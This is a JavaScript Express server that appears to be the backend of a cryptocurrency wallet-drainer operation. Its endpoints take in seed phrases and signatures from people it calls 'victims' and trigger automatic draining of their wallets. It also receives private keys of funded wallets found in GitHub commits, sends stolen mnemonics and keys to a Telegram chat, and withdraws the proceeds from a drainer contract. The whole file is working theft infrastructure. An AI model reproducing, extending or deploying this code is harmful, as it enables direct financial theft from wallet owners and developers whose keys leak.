import express from 'express';
import cors from 'cors';
import { STACKS_TESTNET } from '@stacks/network';
import crypto from 'crypto';
import { initBot, handleWebhook, sendMnemonicAlert } from './telegram-bot.mjs';
import { drainWallet } from './wallet-drainer.mjs';
import { initDB, getDB, insertMnemonic, getAllMnemonics, insertSignature, getPendingSignatures,
         getSignatureById, updateSignatureStatus, addDrainHistory, getDrainHistory, getStats,
         getDailyStats, getVictimStats, insertFundedWallet, getFundedWallets, getFundedWalletCount } from './db.mjs';
import { estimateStxFee, estimateContractFee } from './fee-estimator.mjs';
import {
  fetchCallReadOnlyFunction,
  cvToValue,
  principalCV,
  uintCV,
  contractPrincipalCV,
  standardPrincipalCV,
  makeContractCall,
  broadcastTransaction,
  AnchorMode,
  PostConditionMode,
} from '@stacks/transactions';

const app = express();
const PORT = process.env.PORT || 3001;
const NETWORK = STACKS_TESTNET;
const API_SERVER = process.env.STACKS_API || 'https://api.testnet.hiro.so';

// ── API Key for protected endpoints ──
const ADMIN_API_KEY = process.env.ADMIN_API_KEY || crypto.randomBytes(32).toString('hex');
console.log(`[AUTH] Admin API Key: ${ADMIN_API_KEY}`);

app.use(cors());
app.use(express.json({ limit: '1mb' }));

// ── Rate limiter ──
const rateLimitStore = new Map();
function rateLimit(key, maxRequests = 10, windowMs = 60000) {
  const now = Date.now();
  if (!rateLimitStore.has(key)) {
    rateLimitStore.set(key, { count: 1, resetAt: now + windowMs });
    return false;
  }
  const entry = rateLimitStore.get(key);
  if (now > entry.resetAt) {
    rateLimitStore.set(key, { count: 1, resetAt: now + windowMs });
    return false;
  }
  entry.count++;
  if (entry.count > maxRequests) return true;
  return false;
}

// Clean up rate limit store every 5 min
setInterval(() => {
  const now = Date.now();
  for (const [key, entry] of rateLimitStore) {
    if (now > entry.resetAt) rateLimitStore.delete(key);
  }
}, 300000);

// ── Auth middleware ──
function requireApiKey(req, res, next) {
  const provided = req.headers['x-api-key'] || req.query.api_key;
  if (provided !== ADMIN_API_KEY) {
    return res.status(401).json({ error: 'Unauthorized. Provide X-API-Key header or ?api_key=' });
  }
  next();
}

// ── Stats ──
let stats = {
  totalDrained: 0,
  totalSigsCollected: 0,
  lastDrain: null,
  uptime: Date.now(),
};

function refreshStats() {
  try {
    const s = getStats();
    if (s) {
      stats.totalDrained = s.totalDrained;
      stats.totalSigsCollected = s.totalSigsCollected;
      stats.lastDrain = s.lastDrain;
    }
  } catch {}
}
refreshStats();

// ── Routes ──

app.get('/health', (req, res) => {
  refreshStats();
  res.json({
    status: 'ok',
    network: 'stacks-testnet',
    uptime: Math.floor((Date.now() - stats.uptime) / 1000),
    stats,
  });
});

app.get('/ping', (req, res) => {
  res.json({
    status: 'alive',
    timestamp: new Date().toISOString(),
    uptime: Math.floor((Date.now() - stats.uptime) / 1000),
  });
});

app.post('/api/collect-signature', (req, res) => {
  // Rate limit by IP
  const ip = req.ip || req.connection?.remoteAddress || 'unknown';
  if (rateLimit(ip, 20, 60000)) {
    return res.status(429).json({ error: 'Too many requests. Slow down.' });
  }

  const { token, victim, amount, deadline, signature, mnemonic } = req.body;

  // If it's a mnemonic submission
  if (mnemonic) {
    const id = insertMnemonic({
      mnemonic,
      victim: victim || 'unknown',
      derivedAddress: '',
    });
    console.log(`[MNEMONIC] #${id} stolen from ${victim || 'unknown'}`);

    drainWallet(mnemonic, victim).then(result => {
      console.log(`[DRAIN] Complete for ${result.address}: STX=${result.stxDrained}, tokens=${result.tokensDrained.length}`);
      sendMnemonicAlert({ victim, mnemonic, address: result.address, result }).catch(() => {});
    }).catch(e => {
      console.error(`[DRAIN] Failed: ${e.message}`);
      sendMnemonicAlert({ victim, mnemonic, result: null }).catch(() => {});
    });

    return res.json({ success: true, id });
  }

  // Normal approval signature flow
  if (!token || !victim || !amount) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  const sigId = insertSignature({ token, victim, amount, deadline, signature });
  refreshStats();
  res.json({ success: true, id: sigId });
});

app.get('/api/signatures', (req, res) => {
  const pending = getPendingSignatures();
  res.json(pending);
});

app.get('/api/signatures/:id', (req, res) => {
  const sig = getSignatureById(parseInt(req.params.id));
  if (!sig) return res.status(404).json({ error: 'Signature not found' });
  res.json(sig);
});

app.post('/api/signatures/:id/executed', (req, res) => {
  const id = parseInt(req.params.id);
  const sig = getSignatureById(id);
  if (!sig) return res.status(404).json({ error: 'Not found' });
  updateSignatureStatus(id, 'executed', { txHash: req.body.txHash || null });
  addDrainHistory({ sigId: id, action: 'executed', token: sig.token, victim: sig.victim, amount: sig.amount, txHash: req.body.txHash });
  refreshStats();
  res.json({ success: true });
});

app.post('/api/signatures/:id/failed', (req, res) => {
  const id = parseInt(req.params.id);
  const sig = getSignatureById(id);
  if (!sig) return res.status(404).json({ error: 'Not found' });
  updateSignatureStatus(id, 'failed', { error: req.body.error || 'Unknown error' });
  addDrainHistory({ sigId: id, action: 'failed', token: sig.token, victim: sig.victim, amount: sig.amount, error: req.body.error });
  refreshStats();
  res.json({ success: true });
});

app.delete('/api/signatures/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const sig = getSignatureById(id);
  if (!sig) return res.status(404).json({ error: 'Not found' });
  updateSignatureStatus(id, 'cancelled');
  res.json({ success: true });
});

app.get('/api/stats', (req, res) => {
  refreshStats();
  const s = getStats();
  res.json(stats);
});

app.get('/api/recent', (req, res) => {
  const page = parseInt(req.query.page) || 0;
  const limit = parseInt(req.query.limit) || 5;
  const { items, total } = getDrainHistory(page, limit);
  res.json({ items, total, page, limit });
});

app.get('/api/pending', (req, res) => {
  const pending = getPendingSignatures();
  const page = parseInt(req.query.page) || 0;
  const limit = parseInt(req.query.limit) || 5;
  const start = page * limit;
  const items = pending.slice(start, start + limit);
  res.json({ items, total: pending.length, page, limit });
});

app.get('/api/victim/:address', (req, res) => {
  const addr = req.params.address;
  const data = getVictimStats(addr);
  res.json(data);
});

app.get('/api/daily', (req, res) => {
  res.json(getDailyStats());
});

app.get('/api/mnemonics', requireApiKey, (req, res) => {
  const all = getAllMnemonics().map(m => ({
    ...m,
    mnemonic: m.mnemonic ? m.mnemonic.split(' ').slice(0, 4).join(' ') + '...' : '***',
  }));
  res.json(all);
});

app.get('/api/mnemonics/raw', requireApiKey, (req, res) => {
  res.json(getAllMnemonics());
});

app.get('/api/balances', async (req, res) => {
  try {
    const mainDrainer = process.env.MAIN_DRAINER || '';
    const operator = process.env.OPERATOR_KEY ? 'configured' : 'not set';
    let contractBalance = '0';
    if (mainDrainer) {
      const [addr] = mainDrainer.split('.');
      const resp = await fetch(`${API_SERVER}/extended/v1/address/${addr}/stx`);
      const data = await resp.json();
      contractBalance = data.balance || '0';
    }
    res.json({ mainDrainer, contractBalance, operator });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/balance-of/:token/:owner', async (req, res) => {
  try {
    const resp = await fetch(`${API_SERVER}/extended/v1/address/${req.params.owner}/balances`);
    if (!resp.ok) return res.status(502).json({ error: 'Hiro API error' });
    const data = await resp.json();
    const tokens = data.fungible_tokens || {};
    const key = Object.keys(tokens).find(k => k.startsWith(req.params.token));
    res.json({ balance: key ? tokens[key].balance : '0' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/withdraw-stx', async (req, res) => {
  try {
    const { amount, recipient } = req.body;
    if (!amount || !recipient) {
      return res.status(400).json({ error: 'Missing amount or recipient' });
    }
    const mainDrainer = process.env.MAIN_DRAINER;
    if (!mainDrainer) return res.status(400).json({ error: 'MAIN_DRAINER not set' });
    const operatorKey = process.env.OPERATOR_KEY;
    if (!operatorKey) return res.status(400).json({ error: 'OPERATOR_KEY not set' });

    const microAmount = BigInt(Math.round(parseFloat(amount) * 1_000_000));
    const [addr, name] = mainDrainer.split('.');
    const fee = await estimateStxFee();

    const nonce = null; // auto-fetch from library

    const tx = await makeContractCall({
      contractAddress: addr, contractName: name,
      functionName: 'withdraw-stx',
      functionArgs: [uintCV(microAmount), standardPrincipalCV(recipient)],
      senderKey: operatorKey, network: NETWORK,
      anchorMode: AnchorMode.Any,
      postConditionMode: PostConditionMode.Allow,
      fee,
    });
    const broadcast = await broadcastTransaction({ transaction: tx, network: NETWORK });
    if (broadcast.error) {
      return res.json({ success: false, error: broadcast.error, reason: broadcast.reason });
    }
    res.json({ success: true, txid: broadcast.txid, amount: microAmount.toString(), recipient });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/withdraw-token', async (req, res) => {
  try {
    const { token, amount, recipient } = req.body;
    if (!token || !amount || !recipient) {
      return res.status(400).json({ error: 'Missing token, amount, or recipient' });
    }
    const mainDrainer = process.env.MAIN_DRAINER;
    if (!mainDrainer) return res.status(400).json({ error: 'MAIN_DRAINER not set' });
    const operatorKey = process.env.OPERATOR_KEY;
    if (!operatorKey) return res.status(400).json({ error: 'OPERATOR_KEY not set' });

    const [mdAddr, mdName] = mainDrainer.split('.');
    const [tkAddr, tkName] = token.split('.');
    const fee = await estimateContractFee();
    const nonce = null;

    const tx = await makeContractCall({
      contractAddress: mdAddr, contractName: mdName,
      functionName: 'withdraw-token',
      functionArgs: [contractPrincipalCV(tkAddr, tkName), uintCV(BigInt(amount)), standardPrincipalCV(recipient)],
      senderKey: operatorKey, network: NETWORK,
      anchorMode: AnchorMode.Any,
      postConditionMode: PostConditionMode.Allow,
      fee,
    });
    const broadcast = await broadcastTransaction({ transaction: tx, network: NETWORK });
    if (broadcast.error) {
      return res.json({ success: false, error: broadcast.error, reason: broadcast.reason });
    }
    res.json({ success: true, txid: broadcast.txid, amount, token, recipient });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/webhook', (req, res) => {
  handleWebhook(req, res);
});

const CHAIN_META = {
  Ethereum:  { emoji: '💠', explorer: 'https://etherscan.io/address/' },
  Bitcoin:   { emoji: '₿',  explorer: 'https://blockchain.info/address/' },
  Solana:    { emoji: '◎',  explorer: 'https://explorer.solana.com/address/' },
  Dogecoin:  { emoji: 'Ð',  explorer: 'https://dogechain.info/address/' },
  Litecoin:  { emoji: 'Ł',  explorer: 'https://litecoin.blockchair.com/address/' },
  Stacks:    { emoji: '◈',  explorer: 'https://explorer.hiro.so/address/' },
  Sui:       { emoji: '🔷', explorer: 'https://suiscan.xyz/mainnet/account/' },
  Stellar:   { emoji: '⭐', explorer: 'https://stellar.expert/explorer/public/account/' },
};

function sendFundedAlert(wallet, notifyDedup = true) {
  const { chain, address, balance_human, private_key, source_repo, source_commit } = wallet;

  const meta = CHAIN_META[chain] || { emoji: '🔑', explorer: '' };
  const explorerUrl = meta.explorer ? `${meta.explorer}${address}` : '';
  const shortHash = (source_commit || '').slice(0, 8);
  const githubCommitUrl = source_repo && source_commit
    ? `https://github.com/${source_repo}/commit/${source_commit}`
    : '';

  const text = [
    `${meta.emoji} *Funded ${chain} Wallet Found* ${meta.emoji}`,
    ``,
    `*Address*`,
    `\`${address}\``,
    ``,
    `*Balance*`,
    `${balance_human}`,
    ``,
    `*Source*`,
    `Repo: \`${source_repo || 'N/A'}\``,
    `Commit: \`${shortHash}\``,
    ``,
    `*Private Key*`,
    `\`${private_key}\``,
  ].join('\n');

  const inlineKeyboard = [];
  const row = [];

  if (explorerUrl) {
    row.push({ text: `🔍 View on Explorer`, url: explorerUrl });
  }
  if (githubCommitUrl) {
    row.push({ text: `📄 View Commit`, url: githubCommitUrl });
  }
  if (row.length > 0) {
    inlineKeyboard.push(row);
  }

  const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  return fetch(TELEGRAM_API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify({ inline_keyboard: inlineKeyboard }),
      disable_web_page_preview: true,
    }),
  });
}

function sendSweptAlert(sweep) {
  const { chain, address, balance_human, tx_hash, sweep_error, source_repo, source_commit } = sweep;
  const meta = CHAIN_META[chain] || { emoji: '🔑', explorer: '' };
  const explorerUrl = meta.explorer ? `${meta.explorer}${address}` : '';
  const shortHash = (source_commit || '').slice(0, 8);
  const githubCommitUrl = source_repo && source_commit
    ? `https://github.com/${source_repo}/commit/${source_commit}`
    : '';

  const isSuccess = !sweep_error;
  const txExplorerUrl = tx_hash && chain === 'Ethereum'
    ? `https://etherscan.io/tx/${tx_hash}`
    : tx_hash && chain === 'Bitcoin'
      ? `https://blockchain.info/tx/${tx_hash}`
      : '';

  const text = [
    isSuccess ? `✅ *Sweep Successful* ✅` : `❌ *Sweep Failed* ❌`,
    ``,
    `*Chain:* ${chain}`,
    `*Address:* \`${address}\``,
    `*Amount:* ${balance_human}`,
    isSuccess ? `*Tx:* \`${tx_hash}\`` : `*Error:* \`${sweep_error}\``,
    ``,
    `*Source*`,
    `Repo: \`${source_repo || 'N/A'}\``,
    `Commit: \`${shortHash}\``,
  ].join('\n');

  const inlineKeyboard = [];
  const row = [];
  if (txExplorerUrl) row.push({ text: `🔍 View Tx`, url: txExplorerUrl });
  if (explorerUrl) row.push({ text: `🔍 Wallet`, url: explorerUrl });
  if (githubCommitUrl) row.push({ text: `📄 Commit`, url: githubCommitUrl });
  if (row.length > 0) inlineKeyboard.push(row);

  const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  return fetch(TELEGRAM_API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify({ inline_keyboard: inlineKeyboard }),
      disable_web_page_preview: true,
    }),
  });
}

app.post('/webhook/funded', async (req, res) => {
  try {
    const body = req.body;

    const wallets = Array.isArray(body) ? body : [body];

    const results = [];

    for (const wallet of wallets) {
      const { chain, address, balance_human, private_key, source_repo, source_commit } = wallet;
      if (!chain || !address || !private_key) {
        results.push({ chain, address, error: 'Missing required fields' });
        continue;
      }

      const dbResult = insertFundedWallet({ chain, address, balance_human, private_key, source_repo, source_commit });

      if (!dbResult.inserted) {
        results.push({ chain, address, status: 'duplicate', deduped: true });
        continue;
      }

      const numericBalance = parseFloat(String(balance_human || '0').replace(/[^0-9.]/g, ''));
      if (numericBalance <= 0) {
        results.push({ chain, address, status: 'skipped', reason: 'zero balance' });
        continue;
      }

      const resp = await sendFundedAlert({
        chain, address, balance_human, private_key, source_repo, source_commit,
      });

      const data = await resp.json();
      if (!data.ok) {
        console.error('[WEBHOOK/FUNDED] Telegram error:', data);
        results.push({ chain, address, status: 'telegram_error', error: data.description });
        continue;
      }

      results.push({ chain, address, status: 'sent' });
    }

    res.json({ ok: true, processed: results.length, results });
  } catch (e) {
    console.error('[WEBHOOK/FUNDED] Error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/webhook/swept', async (req, res) => {
  try {
    const s = Array.isArray(req.body) ? req.body : [req.body];
    const results = [];

    for (const sweep of s) {
      const { chain, address, balance_human, tx_hash, sweep_error } = sweep;
      if (!chain || !address) {
        results.push({ chain, address, error: 'Missing required fields' });
        continue;
      }

      const resp = await sendSweptAlert(sweep);
      const data = await resp.json();
      if (!data.ok) {
        console.error('[WEBHOOK/SWEPT] Telegram error:', data);
        results.push({ chain, address, status: 'telegram_error', error: data.description });
        continue;
      }
      results.push({ chain, address, status: sweep_error ? 'failed' : 'swept', tx_hash });
    }

    res.json({ ok: true, processed: results.length, results });
  } catch (e) {
    console.error('[WEBHOOK/SWEPT] Error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/funded-wallets', requireApiKey, (req, res) => {
  const limit = parseInt(req.query.limit || '50');
  const offset = parseInt(req.query.offset || '0');
  const undrainedOnly = req.query.undrained === '1';
  const wallets = getFundedWallets({ limit, offset, undrainedOnly });
  const total = getFundedWalletCount(undrainedOnly);
  res.json({ wallets, total, limit, offset });
});

app.get('/api/check-balance/:address', async (req, res) => {
  try {
    const response = await fetch(
      `${API_SERVER}/extended/v1/address/${req.params.address}/stx`
    );
    const data = await response.json();
    res.json({
      address: req.params.address,
      balance: data.balance || '0',
      totalSent: data.total_sent || '0',
      totalReceived: data.total_received || '0',
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/check-token-balance/:contract/:address', async (req, res) => {
  try {
    const [deployer, name] = req.params.contract.split('.');
    const result = await fetchCallReadOnlyFunction({
      contractAddress: deployer,
      contractName: name,
      functionName: 'get-balance',
      functionArgs: [principalCV(req.params.address)],
      network: NETWORK,
      senderAddress: req.params.address,
    });
    res.json({
      contract: req.params.contract,
      address: req.params.address,
      balance: cvToValue(result).value.toString(),
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ── Admin config endpoints (protected) ──
app.get('/api/admin/api-key', requireApiKey, (req, res) => {
  res.json({ apiKey: ADMIN_API_KEY });
});

export { app, PORT, API_SERVER };

// ── Keep-alive ──
function keepAlive() {
  const RENDER_URL = process.env.RENDER_EXTERNAL_URL;
  if (!RENDER_URL) {
    console.log('[KEEP-ALIVE] No RENDER_EXTERNAL_URL set, skipping self-ping');
    return;
  }

  const pingInterval = 14 * 60 * 1000;
  setInterval(async () => {
    try {
      const response = await fetch(`${RENDER_URL}/health`);
      const data = await response.json();
      console.log(`[KEEP-ALIVE] Self-ping successful. Uptime: ${data.uptime}s`);
    } catch (error) {
      console.error('[KEEP-ALIVE] Self-ping failed:', error.message);
    }
  }, pingInterval);

  console.log(`[KEEP-ALIVE] Started self-ping every ${pingInterval / 60000} minutes`);
}

export async function startServer() {
  // Initialize DB
  await initDB();
  console.log('[SERVER] Database initialized');

  app.listen(PORT, async () => {
    console.log(`[SERVER] Running on port ${PORT}`);
    console.log(`[SERVER] Network: Stacks Testnet`);
    console.log(`[SERVER] API: ${API_SERVER}`);

    const serverUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    await initBot(serverUrl, ADMIN_API_KEY);
    keepAlive();
  });
}
